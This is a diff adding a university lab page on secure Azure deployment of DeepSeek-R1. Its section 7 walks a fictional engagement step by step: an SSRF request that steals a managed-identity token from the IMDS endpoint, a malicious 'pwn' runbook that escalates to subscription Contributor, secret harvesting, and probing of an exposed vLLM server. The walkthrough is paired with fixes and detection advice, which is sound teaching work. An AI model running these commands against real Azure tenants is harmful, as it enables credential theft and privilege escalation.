+    <tr><td>6. Strict access controls</td><td>Entra <span class="gloss" data-gloss="rbac">RBAC</span> (role-based access control) least-privilege — assign <strong>Azure AI Developer</strong>, never <strong>Owner</strong>. Managed identity (not the shared key) for app-to-endpoint. Conditional Access on the tenant. Quarterly access review against the audit log.</td></tr>
+    <tr><td>7. Ongoing testing</td><td>Schedule a recurring agentic pentest (Lab 10 toolchain) against the endpoint using a scoped test identity. Track findings in the same Log Analytics workspace.</td></tr>
+    <tr><td><strong>8. Constrain the agent</strong> <em>(client-side, beyond the NSA list)</em></td><td>Keep <code>dcode</code>'s <strong>approval gates on</strong>; scope its tools; run untrusted tasks in a remote sandbox. Never store the endpoint key in a dotfile or commit it — put it in Key Vault or an env var, and rotate it (<code>az ml serverless-endpoint regenerate-keys</code>) on any suspicion.</td></tr>
+  </tbody>
+</table>
+
+<!-- ============================================================ -->
+<h2 id="iam-chain">7 · Real-world attack chain · Azure managed-identity escalation, SSRF to subscription-wide <span class="time-tag">~45 min</span></h2>
+
+<p>The NSA-aligned hardening in §6 covers the deployment you ship. What it does <em>not</em> cover is what a real engagement looks like when an attacker chains misconfigurations across Azure services. This section walks one such chain end-to-end. The vehicle is a fictional MegaCorpAI / St. Hubbins consulting engagement; the techniques map to incidents Wiz, Orca, and MSRC have published against real Azure-hosted ML platforms in 2024–2026.</p>
+
+<p>The chain has six steps: <span class="gloss" data-gloss="ssrf">SSRF</span> in a public web app → the VM's <span class="gloss" data-gloss="managed-identity">managed-identity</span> token from <span class="gloss" data-gloss="imds">IMDS</span> → an over-broad custom RBAC role → an Automation Account whose identity is <strong>Contributor at the subscription</strong> → five Azure services leaking secrets → a self-hosted DeepSeek/vLLM VM anyone on the internet can hit. Every step maps to something on the NSA seven-principles checklist (§3) — sometimes by violating it, sometimes by being scoped too broadly to matter.</p>
+
+<div class="callout tps">
+  <span class="label">Think · Pair · Share · how does one bug become subscription-wide?</span>
+  <ul class="tps-steps">
+    <li><span class="tps-phase">Think · 3 min</span>The attacker starts as an anonymous internet user hitting one web endpoint and ends with write access across the whole subscription. On your own, name the single Azure primitive that lets a foothold on <em>one</em> VM turn into a <em>broader</em> identity — and the one HTTP request you'd send first from a compromised Azure VM to pick up a token. (Hint: it's a link-local IP and a specific header.)</li>
+  </ul>
+  <details class="tps-reveal">
+    <summary>I've done the Think step — reveal Pair &amp; Share</summary>
+    <ul class="tps-steps">
+      <li><span class="tps-phase">Pair · 4 min</span>Compare predicted chains. Did one of you reach for IMDS + managed identity and the other a leaked key? Which careful, scoped custom role do you each think a later hop quietly makes irrelevant?</li>
+      <li><span class="tps-phase">Share · 2 min</span>As a table, commit to one answer: which <em>built-in</em> role, assigned at which <em>scope</em>, on which <em>shared</em> resource, defeats every scoped custom role upstream of it — then check it against <a href="#iam-chain-3">7.3 · the built-in-role trap</a>.</li>
+    </ul>
+  </details>
+</div>
+
+<div class="viz" id="viz-attack-chain">
+  <div class="viz-title">Try it · step through the escalation</div>
+  <div class="viz-description">
+    Watch one web bug become subscription-wide access. <strong>Step</strong> through the six hops; the orange region is everything the attacker can reach at that moment, and the identity they're acting as is named at the bottom. The jump from hop 2 to hop 3 is the whole lesson — a single over-broad role assignment turns one resource group into the entire subscription.
+  </div>
+  <div class="chain-controls">
+    <button type="button" id="ac-back" class="btn">◀ Back</button>
+    <button type="button" id="ac-step" class="btn">Step ▶</button>
+    <button type="button" id="ac-reset" class="btn">Reset</button>
+    <span class="chain-progress" id="ac-progress"></span>
+  </div>
+  <svg id="ac-svg" class="ac-svg" viewBox="0 0 720 300" preserveAspectRatio="xMidYMid meet" aria-label="Azure privilege-escalation chain, step by step"></svg>
+  <div class="ac-caption" id="ac-caption"></div>
+</div>
+
+<h3 id="iam-chain-1">7.1 Foothold · SSRF on the patient-portal VM (NSA #2 · Validate input)</h3>
+
+<p>The patient portal runs on an Azure VM and has an <code>/api/export?template_url=...</code> endpoint that fetches a URL server-side and renders the report. Classic <span class="gloss" data-gloss="ssrf">Server-Side Request Forgery (SSRF)</span>. On Azure, the crown jewel an SSRF reaches is the <span class="gloss" data-gloss="imds">Instance Metadata Service (IMDS)</span> at the link-local address <code>169.254.169.254</code> — every VM's managed-identity token lives one HTTP request away. Azure's <em>only</em> guard is a required <code>Metadata: true</code> header (there is no AWS-IMDSv2-style session token), so an SSRF that forwards a header, or an app whose HTTP client adds none that conflict, walks right in:</p>
+
+<pre class="term-snippet"><span class="term-comment">kali@kali:~$</span> <span class="term-cmd">curl -s -H "Metadata: true" "https://portal.sthubbins.health/api/export?template_url=\
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01%26resource=https://management.azure.com/"</span>
+{"access_token":"eyJ0eXAiOiJKV1Qi...", "resource":"https://management.azure.com/",
+ "token_type":"Bearer", "client_id":"a1b2c3d4-...", "expires_in":"86399"}
+<span class="term-comment">kali@kali:~$</span> <span class="term-cmd"># decode the JWT payload to learn WHO this token is</span>
+<span class="term-cmd">echo "$ACCESS_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq '{oid, appid, xms_mirid}'</span>
+{"oid":"77e0...","xms_mirid":".../patient-portal-vm","appid":"a1b2c3d4-..."}</pre>
+
+<p>SSRF returned a short-lived <strong>managed-identity token</strong> (a <span class="gloss" data-gloss="jwt">JWT</span>, a JSON Web Token) for the Azure Resource Manager (ARM) management plane — no static key needed. The <code>xms_mirid</code> claim names the identity: the <code>patient-portal-vm</code>'s system-assigned identity. It's short-lived, but it inherits whatever RBAC that VM was granted, and it will happily talk to <code>management.azure.com</code>.</p>
+
+<h3 id="iam-chain-2">7.2 First hop · what the VM's identity can actually do (NSA #5 · Least privilege)</h3>
+
+<p>Authenticate the CLI with the stolen token and enumerate. The VM identity has a <em>custom</em> role scoped to the resource group — reasonable-looking. But two entries give away the next hop:</p>
+
+<pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">az role assignment list --assignee 77e0... --all \
+  --query "[].{role:roleDefinitionName, scope:scope}" -o table</span>
+Role              Scope
+----------------  ------------------------------------------------
+portal-app-role   /subscriptions/…/resourceGroups/sthubbins-rg
+<span class="term-comment">$</span> <span class="term-cmd"># the role definition — most of it is tight, two lines are not</span></pre>
+
+<pre><code class="language-json">{
+  "roleName": "portal-app-role",
+  "assignableScopes": ["/subscriptions/…/resourceGroups/sthubbins-rg"],
+  "permissions": [{
+    "actions": [
+      "Microsoft.Resources/subscriptions/resourceGroups/read",
+      "Microsoft.Storage/storageAccounts/listKeys/action",       // ← account-key theft, unscoped
+      "Microsoft.Automation/automationAccounts/read",
+      "Microsoft.Automation/automationAccounts/jobs/write"        // ← can start runbooks
+    ]
+  }]
+}</code></pre>
+
+<p><code>listKeys</code> hands over storage account keys (§7.4). But the escalation is <code>automationAccounts/jobs/write</code>: the identity can <em>start a <span class="gloss" data-gloss="runbook">runbook</span></em>, and runbooks execute as the Automation Account's <em>own</em> managed identity — a different, and as it turns out far broader, identity.</p>
+
+<h3 id="iam-chain-3">7.3 Second hop · the Automation Account's Contributor identity (NSA #5 · the built-in-role trap)</h3>
+
+<p>The <code>mlops-automation</code> <span class="gloss" data-gloss="automation-account">Automation Account</span> exists to run nightly retraining jobs. Someone gave its system-assigned identity the built-in <strong>Contributor</strong> role — assigned at the <em>subscription</em> scope, "so the runbooks don't fail." That single assignment is the entire bug. We publish a one-line runbook that grabs a token and runs as that identity:</p>
+
+<pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">az automation runbook create -g sthubbins-rg --automation-account-name mlops-automation \
+  -n pwn --type PowerShell
+$ az automation runbook replace-content ... --content 'Connect-AzAccount -Identity; Get-AzSubscription'
+$ az automation runbook start -g sthubbins-rg --automation-account-name mlops-automation -n pwn</span>
+<span class="term-comment"># the job runs as mlops-automation's identity — now check what THAT can do</span>
+<span class="term-comment">$</span> <span class="term-cmd">az role assignment list --assignee &lt;automation-mi-oid&gt; --all -o table</span>
+Role         Scope
+-----------  -------------------------------
+Contributor  /subscriptions/8f2a…            <!-- entire subscription -->
+</pre>
+
+<div class="callout insight">
+  <span class="label">Vulnerability · Contributor-at-subscription on a shared automation identity · MITRE ATT&amp;CK T1078.004 (Valid Accounts: Cloud)</span>
+  <p><strong>Contributor</strong> grants write on nearly every resource in its scope — it can't touch RBAC itself (<code>Microsoft.Authorization/*/write</code> is excluded), but it can read every storage key, deploy resources, run commands on VMs, and pull from every registry. Assigned at <em>subscription</em> scope on a <em>shared</em> automation identity that any RG-scoped role can trigger, it sits downstream of — and quietly cancels — every carefully scoped custom role above it. This is the Azure twin of AWS's <code>AmazonSageMakerFullAccess</code> trap: a convenient broad grant on a shared resource.</p>
+<pre><code class="language-bash"># the moment of accidental cross-team access — resources from other clients appear
+$ az resource list --query "[].resourceGroup" -o tsv | sort -u
+rainyday-risk-rg        # a completely different client
+sthubbins-rg            # ours
+tapheads-fraud-rg       # another client</code></pre>
+  <p>The fix is structural: never assign built-in <strong>Contributor</strong>/<strong>Owner</strong> at subscription or resource-group (RG) scope to a shared or automation identity. Use a custom role scoped to the exact resources the runbook touches, and <a href="https://learn.microsoft.com/entra/id-governance/privileged-identity-management/">Privileged Identity Management (PIM)</a> for just-in-time elevation instead of standing privilege.</p>
+</div>
+
+<h3 id="iam-chain-4">7.4 Secrets sprawl · five Azure services (NSA #4 · Encrypt + #6 · Logging)</h3>
+
+<p>With subscription-wide write we go shopping for credentials. ML pipelines fragment secrets across services because each integration ("write to blob," "read a connection string," "log a run") needs its own touch-point. Each row below is a real Azure pattern; they generalize.</p>
+
+<table>
+  <thead><tr><th>Service</th><th>Leak vector</th><th>What it gave up</th></tr></thead>
+  <tbody>
+    <tr><td><strong>Azure Key Vault</strong></td><td>RBAC/access-policy too broad + <strong>version history</strong> retained</td><td>Current DB password + the <em>previous</em> one (rotated but still readable via <code>/secrets/{name}/{oldVersion}</code>)</td></tr>
+    <tr><td><strong>Storage account</strong></td><td><code>listKeys</code> → account key → download blob</td><td><code>patient_feedback.csv</code> — names, emails, departments — straight protected health information (PHI)</td></tr>
+    <tr><td><strong>App Configuration</strong></td><td>Connection strings stored as plaintext key-values, not Key Vault references</td><td>Postgres + Service Bus connection strings in the clear</td></tr>
+    <tr><td><strong>Automation variables</strong></td><td>Variable created with <code>Encrypted = false</code></td><td>A <span class="gloss" data-gloss="service-principal">service-principal</span> client secret with its own standing access</td></tr>
+    <tr><td><strong>Container Registry (ACR)</strong></td><td><code>az acr login</code> (Contributor) → pull image → <code>docker inspect</code></td><td>Hugging Face token + storage key baked into an <code>ENV</code> at build time</td></tr>
+  </tbody>
+</table>
+
+<p>The recurring lesson: <strong>ML workflows scatter secrets across services without centralized secret management</strong>. Each service becomes another hiding place; defenders chase them service-by-service while attackers enumerate them in a morning. The fix is one secret store (Azure Key Vault with <em>RBAC</em>, not legacy access policies), short-lived issued credentials, purge of old versions, and an aggressive ban on plaintext everywhere else — App Configuration Key Vault references, encrypted Automation variables, no secrets in image <code>ENV</code>.</p>
+
+<h3 id="iam-chain-5">7.5 The internet-exposed model (NSA #3 · Restrict network access)</h3>
+
+<p>Instead of the hardened serverless endpoint from §5, a hurried team self-hosted DeepSeek-R1 on a raw GPU VM running vLLM. Contributor lets us enumerate compute and its network rules:</p>
+
+<pre class="term-snippet"><span class="term-comment">$</span> <span class="term-cmd">az vm list -d --query "[?publicIps!=''].{name:name, ip:publicIps, size:hardwareProfile.vmSize}" -o table</span>
+Name           Ip              Size
+-------------  --------------  -----------------
+deepseek-vllm-vm    20.85.123.45    Standard_NC24ads_A100_v4
+<span class="term-comment">$</span> <span class="term-cmd">az network nsg rule list --nsg-name deepseek-vllm-nsg -g sthubbins-rg \
+  --query "[?access=='Allow'].{name:name, port:destinationPortRange, src:sourceAddressPrefix}" -o table</span>
+Name        Port   Src
+----------  -----  --------
+ssh         22     Internet
+vllm-api    8000   Internet      <-- the model, open to the world
+<span class="term-comment">$</span> <span class="term-cmd">curl -s http://20.85.123.45:8000/v1/models | jq -r '.data[].id'</span>
+deepseek-ai/DeepSeek-R1</pre>
+
+<p>An A100 VM running vLLM with port 8000 open to <code>Internet</code> (Azure's name for <code>0.0.0.0/0</code>) and <strong>no authentication</strong>. Any internet user queries the model directly — bypassing the serverless endpoint's key auth, its Content Safety filter, the RBAC, and every audit log Azure would have written for an authorized call. This is the §4 lesson made operational: the gateway is not the model server.</p>
+
+<div class="callout note">
+  <span class="label">why this matters more for cloud than for the server lab</span>
+  <p>The §6 NSA checklist made "private networking (Private Endpoints / VNet)" its own principle. This is why. A vLLM server bound to <code>0.0.0.0:8000</code> inside a VNet reaches the public internet the moment its Network Security Group has an <em>Allow</em> rule with source <code>Internet</code> on port 8000 — and NSGs are configured by application teams, not by the platform team that wrote the RBAC. The vLLM VM defeated every RBAC control upstream of it without the attacker sending a single management-plane call.</p>
+</div>
+
+<h3 id="iam-chain-recap">7.6 What the chain looked like, end to end</h3>
+
+<table>
+  <thead><tr><th>Hop</th><th>Identity</th><th>Capability gained</th><th>NSA principle violated (§3)</th></tr></thead>
+  <tbody>
+    <tr><td>0</td><td>Internet</td><td>SSRF in <code>/api/export</code></td><td>#2 Validate input</td></tr>
+    <tr><td>1</td><td><code>patient-portal-vm</code> managed identity</td><td>IMDS → ARM token + RBAC map</td><td>#2 Input + #3 Network (IMDS reachable)</td></tr>
+    <tr><td>2</td><td>same (custom <code>portal-app-role</code>)</td><td>unscoped <code>listKeys</code> + start Automation runbooks</td><td>#5 Least privilege</td></tr>
+    <tr><td>3</td><td><code>mlops-automation</code> identity</td><td>runbook exec → <strong>Contributor at subscription</strong></td><td>#5 (the trap)</td></tr>
+    <tr><td>4</td><td>same</td><td>five-service secret hunt yields production creds</td><td>#6 Logging + #4 Encrypt</td></tr>
+    <tr><td>5</td><td>Internet (no creds)</td><td>direct query to self-hosted DeepSeek/vLLM VM · no auth</td><td>#3 Private networking</td></tr>
+  </tbody>
+</table>
+
+<div class="callout insight">
+  <span class="label">the seven structural fixes</span>
+  <ol>
+    <li><strong>Validate the <code>template_url</code> at the edge.</strong> Allowlist trusted hosts; refuse <code>file://</code>, the link-local <code>169.254.169.254</code>, and any private/internal IP. The SSRF is the door; close the door.</li>
+    <li><strong>Never grant built-in <code>Contributor</code>/<code>Owner</code> at subscription or RG scope to a shared or automation identity.</strong> Use a custom role scoped to the exact resources the workload touches. <a href="https://learn.microsoft.com/azure/role-based-access-control/best-practices">Azure RBAC best practices</a> is the starting point.</li>
+    <li><strong>Shrink the IMDS blast radius.</strong> Azure has no IMDSv2-style session token — the <code>Metadata: true</code> header is the only guard — so the defense is scope: keep each VM/App identity's RBAC tiny, and block outbound to <code>169.254.169.254</code> from request-handling code. A stolen token should be worth almost nothing.</li>
+    <li><strong>Centralize secrets in Key Vault (RBAC, not access policies).</strong> Purge old versions; ban plaintext elsewhere — App Configuration Key Vault references, <em>encrypted</em> Automation variables, no secrets in App Configuration key-values.</li>
+    <li><strong>Alert on the tells in Azure Monitor / Defender for Cloud.</strong> Anomalous managed-identity token use, Automation runbook job creation by an unexpected principal, and new role assignments. Delete or redact historical log streams that captured secrets.</li>
+    <li><strong>Strip <code>ENV</code> secrets from images at build time.</strong> Use BuildKit secrets (<code>--mount=type=secret</code>) for build-time credentials so they don't bake into the final image; scan ACR images for embedded keys.</li>
+    <li><strong>Default-deny NSGs + Private Endpoints; zero <code>Internet</code>-sourced rules on model ports.</strong> The hardened serverless endpoint (key auth + Content Safety + audit) is what should face callers — never a raw vLLM VM. If you must self-host, it binds <code>127.0.0.1</code> behind a <span class="gloss" data-gloss="reverse-proxy">reverse proxy</span>.</li>
+  </ol>
+</div>
+
+<div class="exercise">
+  <span class="exercise-q">Try it · the cheapest signal on this chain</span>
+  <p>Which Azure Activity Log event would have given the earliest, highest-signal alert in this engagement? The earliest moment a SOC could have caught it — and what alert would have made the catch cheap?</p>
+  <details><summary>Show one defensible answer</summary><div><strong>The first Automation runbook <em>job creation</em> triggered by the <code>patient-portal-vm</code> identity.</strong> A web-portal VM should never start an MLOps runbook. An Azure Monitor alert on Activity Log <code>Microsoft.Automation/automationAccounts/jobs/write</code> where the caller is the portal's managed identity would have fired on hop 3 — before any secrets were read, before the subscription-wide token was ever used. Pair it with a paging-loud playbook ("portal identity started an automation job — expected?"). Cheap to write; impossible to evade, because the escalation <em>requires</em> that runbook to run.</div></details>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="practices">8 · Best practices</h2>
+
+<div class="practice"><span class="practice-num">1</span><div><strong>Read the shared-responsibility doc for your platform before you ship.</strong> <a href="https://cloud.google.com/blog/products/identity-security/shared-fate-a-new-approach-to-cloud-security">GCP shared fate</a>, <a href="https://learn.microsoft.com/azure/security/fundamentals/shared-responsibility">Azure shared responsibility</a>, <a href="https://aws.amazon.com/compliance/shared-responsibility-model/">AWS shared responsibility</a>. Read once, save the link.</div></div>
+
+<div class="practice"><span class="practice-num">2</span><div><strong>Default-deny public networking.</strong> Private endpoints / VPC service controls / PrivateLink — pick the right primitive for your cloud, turn it on at project creation, and require an exception process to open a public IP.</div></div>
+
+<div class="practice"><span class="practice-num">3</span><div><strong>Use workload identity, not static keys.</strong> Every cloud has the equivalent. Static keys leak (commit to git, screenshot in Slack, baked into a container image); workload identities don't have that failure mode.</div></div>
+
+<div class="practice"><span class="practice-num">4</span><div><strong>Audit logs into a queryable warehouse on day one.</strong> Azure Log Analytics (KQL, as in §5.6), BigQuery, Snowflake, S3 + Athena — whatever you like. Not "we have logs"; "we have logs and we can SQL them within five minutes." This is the difference between "yes we'll investigate" and an actual investigation.</div></div>
+
+<div class="practice"><span class="practice-num">5</span><div><strong>Set a budget alert at 50%, 80%, 100% of expected.</strong> Cloud bills surprise people every semester. A run-away agent — <code>dcode</code> stuck in a loop — that calls your endpoint a million times overnight will cost you. In Azure, put a <strong>Cost Management</strong> budget on the subscription (or resource group) with alerts; the alert is the cap.</div></div>
+
+<div class="practice"><span class="practice-num">6</span><div><strong>Pin model versions explicitly.</strong> A catalog alias like "DeepSeek-R1" resolves to the <em>latest</em> version and can be silently re-pointed by the platform. Pin the specific version your evaluation passed against (the <code>/versions/N</code> you dropped in §5.3). Plan a quarterly migration window to bump it.</div></div>
+
+<div class="practice"><span class="practice-num">7</span><div><strong>Layer your safety classifier on top of the platform's safety filter.</strong> Azure AI Content Safety screens your endpoint by default. Use it <em>and</em> your Lab 11 classifier — different failure modes, complementary coverage.</div></div>
+
+<div class="practice"><span class="practice-num">8</span><div><strong>Tag every resource.</strong> Project, owner, environment, cost-center. Three months from now the question "what is this for?" is asked about every resource, and labels are the only honest answer.</div></div>
+
+<!-- ============================================================ -->
+<h2 id="antipatterns">9 · Anti-patterns</h2>
+
+<div class="callout note">
+  <span class="label">things that look like cloud security but aren't</span>
+  <ul>
+    <li><strong>Click-ops everything.</strong> Manual console configuration produces a deployment nobody else can reproduce or audit. Terraform / Pulumi / Bicep / CloudFormation — pick one and check it in.</li>
+    <li><strong>One resource group per environment under a single subscription, with a managed identity handed Owner or Contributor at subscription scope.</strong> The blast radius of any compromised identity is then "the whole subscription" (exactly the §7 chain). Scope RBAC to the resource, or you're paying for cloud and getting laptop-level security.</li>
+    <li><strong>Trusting the platform's content filter as the only defense.</strong> Cloud-native filters catch common cases. Your application has specific risks; your Lab 11 classifier covers those.</li>
+    <li><strong>Long-lived service-principal client secrets (or endpoint keys) committed to a private repo.</strong> Private isn't the same as encrypted. <code>git history</code> + a stolen laptop is the most common exfiltration path. Use Entra managed identity or short-lived tokens, and keep any unavoidable key in Key Vault.</li>
+    <li><strong>Skipping the threat model because "it's just a demo."</strong> Demos get demoed, demoed things get production-ized, the threat model never gets written. Do it once, at the start, in five paragraphs of Markdown.</li>
+  </ul>
+</div>
+
+<!-- ============================================================ -->
+<h2 id="faq">FAQ</h2>
+
+<h3>Why Azure for this lab?</h3>
+<p>Because Azure AI Foundry has the deepest enterprise-identity integration (Entra) — which makes the identity and RBAC lessons concrete — and it deploys DeepSeek-R1 serverless straight from the CLI. Vertex and Bedrock are operationally equivalent for this material; if your account is elsewhere, the concepts in §2 transfer, but the exact CLI commands won't. Learn one cloud in depth here.</p>
+
+<h3>What if my team is on-prem only?</h3>
+<p>Same patterns, different primitives: replace Identity-Aware Proxy (IAP) with OpenID Connect (OIDC) + an authenticating reverse proxy, replace IAM with Kerberos/RBAC, replace BigQuery with Splunk/Elastic. The seven NSA principles all apply.</p>
+
+<h3>What's the cheapest production-realistic deployment?</h3>
+<p>Azure Foundry serverless DeepSeek-R1 (pay-per-token, no VM to keep running) behind the default content filter, audited to Log Analytics. If your subscription can't use serverless yet, managed compute on the smallest GPU SKU works — just scale it to zero or delete the endpoint the moment you're done, or the running VM quietly burns your budget.</p>
+
+<h3>Is DeepSeek-R1 really deployable from the CLI?</h3>
+<p>Yes — we deployed it end-to-end while writing this lab. Its Model ID resolves in the <code>azureml-deepseek</code> registry, and it's <em>sold by Azure</em>, so <code>az ml serverless-endpoint create</code> stands up a key-authed endpoint with no Marketplace subscription step. The one variable is region: serverless availability differs by region (a sibling model, DeepSeek-V3.1, returned <code>ServerlessModelNotAvailable</code> in our region while R1 deployed cleanly). If create reports the model unavailable, recreate the workspace in a <a href="https://learn.microsoft.com/azure/ai-foundry/how-to/deploy-models-serverless-availability">supported region</a> or use managed compute. Want a different model? Any serverless catalog entry works — swap the <code>model_id</code>; the agent and audit wiring are identical.</p>
+
+<h3>Is it safe to let dcode run my shell with a self-hosted model?</h3>
+<p>Only with the guardrails on. The model being yours doesn't make its output trustworthy — a prompt-injected file or a hallucinated command is just as dangerous from DeepSeek-R1 as from any model. Keep <code>dcode</code>'s approval gates enabled, scope its tools, and run anything touching untrusted input in a remote sandbox. See the §5.5 callout and hardening row 8.</p>
+
+<h3>Does this work with Claude / Gemini / GPT directly (no open-weights)?</h3>
+<p>Yes. Replace §5.3 with a managed-model API call (no GPU SKU, no Marketplace subscription). Everything else — Entra auth, content safety, audit logs, the dcode wiring, the threat model — is identical. The shared-responsibility line in the try-it widget shifts to the "SaaS API" position, but the layers you own are the same.</p>
+
+<footer>
+DS 6042 — Lab 13 · cloud-managed deployment, NSA-aligned. Lab style codified in <code>CLAUDE.md</code>. NSA guidance is U.S. government work in the public domain.
+</footer>
+
+</main>
+
+<script src="../_shared/lab-base.js?v=6"></script>
+<script src="viz.js?v=10"></script>
+</body>
+</html>
